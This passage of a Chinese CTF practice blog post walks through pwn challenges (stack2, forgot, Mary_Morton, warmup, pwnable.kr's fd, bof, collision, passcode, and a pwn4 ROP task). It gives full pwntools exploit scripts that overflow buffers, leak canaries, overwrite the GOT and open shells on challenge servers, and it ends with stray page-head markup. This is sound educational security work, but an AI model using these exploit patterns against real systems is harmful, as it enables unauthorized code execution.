class="string">'debug'</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">43642</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x50</span><span class="number">-0x10</span>)*<span class="string">'a'</span> + p64(<span class="number">10</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.srand(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    p.recvuntil(<span class="string">'point(1~6): '</span>)</span><br><span class="line">    p.sendline(str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200607160518598.png" alt="image-20200607160518598"></p><p><strong>总结：1.虽然没有接触新知识，但是学了加载libc.so.6库使用其的函数。</strong></p><h3 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h3><blockquote><p>由于数组没有控制界限，还是栈溢出。这个题由于出题人在题中直接给出了bin/bash，而环境中只有sh，但只要ROP一下，自己通过bin/bash构造sh给system做参数即可。</p></blockquote><p>查保护，除了基地址随机化其他全开。感觉会有点麻烦，难度要绕过canary？ida中看一下。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609105006912.png" alt="image-20200609105006912"></p><p>正好看到字符串中有现成的system函数及shell，所以通过上面的数组溢出将函数的返回地址改为system处的地址就得到shell了。</p><p>开始计算数组的地址到函数返回地址处在栈中的偏移，由于ida中静态看到的栈分布可能不准，通过gdb动调看一下。找到第一次给数组赋值的地址及最后ret指令地址下断。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609105624424.png" alt="image-20200609105624424"></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609105703718.png" alt="image-20200609105703718"></p><p>可以看到上面2次的地址分别为<strong>0xffffd01c</strong> <strong>0xffffcf98</strong> 2者之差为<strong>0x84</strong>，即我们要的偏移。</p><p>开始写脚本攻击，但是并没有得到shell。。。找了一会儿错误，没发现。看了其他人的writeup说由于出题人原因，环境中并没有bash，可以通过已有的 /bin/bash得到sh字符串，作为system()参数才行。</p><p>也很容易，直接找到字符串地址，利用数组越界多改变栈中的一个数据为<strong>sh</strong>作为system()的参数即可。exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">58409</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">132</span></span><br><span class="line">system_addr = [<span class="number">0xb4</span>, <span class="number">0x85</span>, <span class="number">0x04</span>, <span class="number">0x08</span>]</span><br><span class="line">sh_addr = [<span class="number">0x87</span>, <span class="number">0x89</span>, <span class="number">0x04</span>, <span class="number">0x08</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_</span><span class="params">(offset, val)</span>:</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(str(offset))</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(str(val))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">	write_(offset+i, system_addr[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">	write_(offset+<span class="number">4</span>+i, sh_addr[i])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609110724445.png" alt="image-20200609110724445"></p><p>最后关于这个题的栈从ida中静态看到栈与实际动调不同的原因，看开头与结尾的汇编代码可以知道答案。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610140544469.png" alt="image-20200610140544469"></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610140847175.png" alt="image-20200610140847175"></p><p><strong>总结：1.从这个题发现数组越界就可以绕过canary，但也是题故意设计的而已。2.静态看到的栈分布于实际运行的可能会不同，这道题就是。</strong></p><h3 id="forot"><a href="#forot" class="headerlink" title="forot"></a>forot</h3><blockquote><p>栈溢出，多了会对输入字符进行判断多构造下。但是当对整个main函数运行完后在ret处控制其走向始终不成功。。。gdb调试栈的偏移反复确定了的，比在ida中静态看到的大4，但这多出来的4就很迷。。。最后觉得是程序在出栈时有一个值还原，有点canary的意思，但是程序没有开canary保护啊。搞了很久还是没弄清原因，后面知识积累多了再来看看怎么回事。。。</p></blockquote><p>只开了NX保护，ida中看下。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610171656557.png" alt="image-20200610171656557"></p><p>再看看栈的情况。找到v3与v2数组的地址。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610171941539.png" alt="image-20200610171941539"></p><p>再看到程序中直接有system函数及字符串。</p><p>所以接下来要做的就是改变函数指针并控制v14的值，构造其执行我们的system（）函数。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610172311560.png" alt="image-20200610172311560"></p><p>写脚本攻击。这里方法也很多吧，只要构造配合好就可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">39422</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x20</span>*<span class="string">'A'</span>+p32(<span class="number">0x080486D2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'Bxnop'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610172459341.png" alt="image-20200610172459341"></p><p><strong>总结：1.还是栈溢出，但不是通过改变函数的返回地址，见识更多了吧。2.\x09与\xa是坏字符，当读到这2个字符的时候会截断。</strong></p><h3 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h3><blockquote><p>通过格式化字符串漏洞找到canary后栈溢出控制程序走向。但是。。。。。。。因为开始使用的recvuntil(‘’)没有注意<strong>‘\n’</strong>导致后面直接使用recv()开始只能接收到<strong>’\n’</strong>，花了好多时间卡在这里。。。。。。。。。。算教训了。</p></blockquote><p>除了PIE其他保护全开。运行看一下，让选择是栈溢出还是格式化字符串漏洞。 ida中看看。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200611162320998.png" alt="image-20200611162320998"></p><p>虽然是第一次遇到，但也是很容易想到，格式化字符串漏洞是让我们泄露canary用的，知道的canary就可以快乐的栈溢出了。</p><p>那剩下的就都是常规操作了，脚本攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">53667</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'3. Exit the battle '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(<span class="string">'%23$p'</span>)</span><br><span class="line">canary = int(p.recv(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x88</span>*<span class="string">'a'</span> + p64(canary) + <span class="number">8</span>*<span class="string">'a'</span> + p64(<span class="number">0x00000000004008DA</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'3. Exit the battle '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>问题来了。。。无论怎么改<strong>canary = int(p.recv(), 16)</strong>接受屏幕打印出的字符这句话都报错。。。2个多小时耗在这里。。。后面就试了试先<strong>p.recvuntil(‘0x’)</strong>，成功了。。。但自己还是很郁闷。。。又继续找原因，最后才发现<strong>p.recvuntil(‘3. Exit the battle ‘)</strong>中少了 <strong>\n</strong>，导致后面直接recv()接受到的都是回车，还是recvuntil()保障。。。</p><p>加上后再攻击，成功。。。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200611163417332.png" alt="image-20200611163417332"></p><p>总结：1.还是多用recvuntil吧，保障些。2.注意使用recvuntil时中的字符串是否包含到最后。3.RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><blockquote><p>ADworld没有给题目附件，最后看了看别人发的ida伪代码，就只是简单的栈溢出控制程序走向。</p></blockquote><p>题目开头就给了一个地址，后面又是明显的栈溢出，猜也可猜到是将函数返回地址覆盖为给出的地址。</p><p>脚本攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">37196</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x40</span>+<span class="number">8</span>)*<span class="string">'a'</span> + p64(<span class="number">0x40060d</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200612101533939.png" alt="image-20200612101533939"></p><h2 id="pwnable"><a href="#pwnable" class="headerlink" title="pwnable"></a>pwnable</h2><h3 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h3><p>题目描述。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603151159958.png" alt="image-20200603151159958"></p><p>通过ssh连接后，有3个文件，flag没有权限查看，那就看 fd.c</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603151520348.png" alt="image-20200603151520348"></p><p>由于read函数的第一个参数，0：标准输入；1：标准输出；2：标准错误输出。那这里只要样fd等于0就好了。</p><p>直接让输入第一个参数为 4,660(0x1234)，接着再输入 LETMEWIN 得到flag。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603152007549.png" alt="image-20200603152007549"></p><h3 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h3><blockquote><p>学习了栈溢出后做这个题正合适</p></blockquote><p>得到题目的elf文件后ida打开。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603152328450.png" alt="image-20200603152328450"></p><p>再利用ida中很好的栈显示，计算得到需要填充大小 0x34 。</p><p>写py脚本，攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="number">0x34</span>*<span class="string">'a'</span> + p32(<span class="number">0xCAFEBABE</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(message)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603152657713.png" alt="image-20200603152657713"></p><p><strong>总结：从基础的溢出开始，慢慢进步。</strong></p><h3 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h3><p>题目描述。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605090406828.png" alt="image-20200605090406828"></p><p>ssh连接后发现就是让我们输入20个字节的数据，然后转化为5个4字节数据的值相加为0x21DD09EC。</p><p>那就直接凑了，开始直接想的是输入16个0加一个原数据，但字符串计算长度时就会过不了。那凑得方法也很多，只是怎样将不可打印字符输入终端，知道可以使用python的单行执行脚本呢 -c。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605090938145.png" alt="image-20200605090938145"></p><p>另外其实一直想用脚本直接实现，但是不知道怎么用，网上果然有，学习了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = p32(<span class="number">0x6c5cec9</span>)*<span class="number">4</span> + p32(<span class="number">0x6c5cec8</span>)</span><br><span class="line"></span><br><span class="line">p = ssh(host=<span class="string">'pwnable.kr'</span>, port=<span class="number">2222</span>, user=<span class="string">'col'</span>, password=<span class="string">'guest'</span>)</span><br><span class="line">p.connected()</span><br><span class="line"></span><br><span class="line">p1 = p.process(argv=[<span class="string">'col'</span>, s], executable=<span class="string">'./col'</span>)</span><br><span class="line"><span class="keyword">print</span> p1.recv()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605092003637.png" alt="image-20200605092003637"></p><p><strong>总结：1.利用python单行脚本输入不打印字符数据。2.利用脚本对ssh连接并交互的方法。3.哈希碰撞的概念。</strong></p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>查看保护的时候发现了upx壳，脱壳后载入ida即可发现flag。</p><p>总结：无。</p><h3 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h3><blockquote><p>利用scanf()函数中没加取址符&amp;存在的漏洞，覆写got表来达到控制程序走向的目的。</p></blockquote><p>题目描述。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608181103998.png" alt="image-20200608181103998"></p><p>连接后查看passcode.c文件，可以看到scanf()是没有加取地址符的，想通过输入达到目的肯定会报错。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> passcode1;</span><br><span class="line">	<span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">	fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">	<span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// something after login...</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看到welcome（）函数，scanf(“%100s”, name)对输入字符串长度进行了限制，想通过溢出是不行了。</p><p>既然程序出了问题是没加取址符，那突破口肯定就在哪里。又是我第一次遇到的漏洞类型，由于scanf(“%d”, passcode1)中passcode1没加取地址符，将会把passcode1本身的值作为地址然后向其写入数据。并且这个passcode1没有初始化，所以它的默认的值将是上次栈中留下来的值，我们就可以控制上次向栈中写的数据，使scanf（）中的地址是我们向输入数据的地址。</p><blockquote><p>知识点：在welcome（）函数结束后，虽然它会<strong>push esp, ebp；pop ebp；ret</strong>进行一个堆栈平衡，但是只是改变了esp寄存器的值，栈中的内容没有进行清理，如果下次使用同一个栈定义了变量但没有赋初值，那它的初始值将是上次栈中的。</p></blockquote><p>由于got表是可以重写的，它记录着我们要执行函数的地址，那我们就可以将下次要执行的函数地址改成我们想要它执行的函数地址。通过<strong>objdump -R passcode</strong>查看got表。可以看到我们要改写函数在got表中地址为 <strong>0x0804a004</strong></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608182629397.png" alt="image-20200608182629397"></p><p>找我们想要执行的函数的地址。使用<strong>objdump -d passcode</strong>查看反汇编。找到我们想要执行函数地址：<strong>0x080485e3</strong></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608183049831.png" alt="image-20200608183049831"></p><p>地址找到后，寻找第一次welcome()函数中输入的字符串的哪一部分会是后面login()函数的第一个变量的值。其实很简单，2个函数是同一个ebp，第一个函数输入的最后4个字节数据将是第二个函数第一个变量的4个字节数据。（解释起来有点抽象，理解了就很简单）</p><p>最后构造字符串，攻击。由于登录到远程终端里没有执行和写脚本的权限，直接使用python与管道命令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"print 'a'*96 + '\x04\xa0\x04\x08' + '134514147'"</span> | ./passcode</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608184738940.png" alt="image-20200608184738940"></p><p><strong>总结：1.2个命令的学习 objdump -R 文件名（查看got表） 与 objdump -d 文件名（查看反汇编）。2.覆写got的攻击。</strong></p><h2 id="论剑场"><a href="#论剑场" class="headerlink" title="论剑场"></a>论剑场</h2><h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><blockquote><p>利用栈溢出控制程序的走向</p></blockquote><p>首先使用file与checksec查看一下，64为elf文件，且没有开任何保护，那没有canary，就可以利用栈溢出控制程序走向了。</p><p>ida中看一下，明显存在溢出。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605092808030-1591322466624.png" alt="image-20200605092808030"></p><p>继续看一下字符串，找到引用的地方发现了system命令，但不是打开shell之类的字符串。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605093020161.png" alt="image-20200605093020161"></p><p>由于刚接触，很多东西都不知道，看了writeup，长知识了。由于题中有 $0 字符，而这就是 shell本身的名称，可以用它当作传入的system（）函数的参数使用。</p><blockquote><p>一个知识点：<code>system()</code>会调用<code>fork()</code>产生子进程，由子进程来调用<code>/bin/bash -c string</code>来执行参数<code>string</code>字符串所代表的命令，此命令执行完后随即返回原调用的进程。</p></blockquote><blockquote><p>64位程序传参的特点：<strong>使用寄存器传参</strong>，分别用<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>来传递参数（参数个数小于7的时候）。</p></blockquote><p>所以这里要先让程序的走向到 <code>pop edi;ret</code>, 让第一个传参寄存器得到 $0的地址，那后面再通过ret 使system（）的地址弹出给 eip，得到shell。</p><p>开始工作。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095114997.png" alt="image-20200605095114997"></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095231700.png" alt="image-20200605095231700"></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095322038.png" alt="image-20200605095322038"></p><p>写利用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'114.116.54.89'</span>, <span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line">edi = <span class="number">0x00000000004007d3</span></span><br><span class="line">bash = <span class="number">0x000000000060111f</span></span><br><span class="line">sys = <span class="number">0x000000000040075A</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x10</span>+<span class="number">8</span>)*<span class="string">'a'</span> + p64(edi) + p64(bash) + p64(sys)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>得到shell。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095503617.png" alt="image-20200605095503617"></p><p><strong>总结：1.在没有‘bin\bash’字符串时看看’$0‘。2.64位程序的传参方式，寄存器顺序。3.ROPgadget工具的使用。</strong></p></div><div><ul class="post-copyright"><li class="post-copyright-author"> <strong>Post author:</strong> ooo</li><li class="post-copyright-link"> <strong>Post link:</strong> <a href="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/" title="pwn练习">https://www.bxnop.cn/2020/06/04/pwn练习/</a></li><li class="post-copyright-license"> <strong>Copyright Notice:</strong> All articles in this blog are licensed under<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i> BY-NC-SA</a> unless stating additionally.</li></ul></div><div><div><div style="text-align:center;color:#ccc;font-size:14px">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div></div></div><footer class="post-footer"><div class="post-nav"><div class="post-nav-item"><a href="/2020/06/03/pwn%E7%AC%94%E8%AE%B0/" rel="prev" title="pwn笔记"><i class="fa fa-chevron-left"></i> pwn笔记</a></div><div class="post-nav-item"> <a href="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="next" title="2020年DASCTF六月线上赛">2020年DASCTF六月线上赛<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div><script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/2.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/2.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.bxnop.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="pwn的一些练习记录~">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn练习">
+<meta property="og:url" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Bxb0&#39;s blog">
+<meta property="og:description" content="pwn的一些练习记录~">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200604180206603.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200604180443703.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605123722286.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605124200541.png">
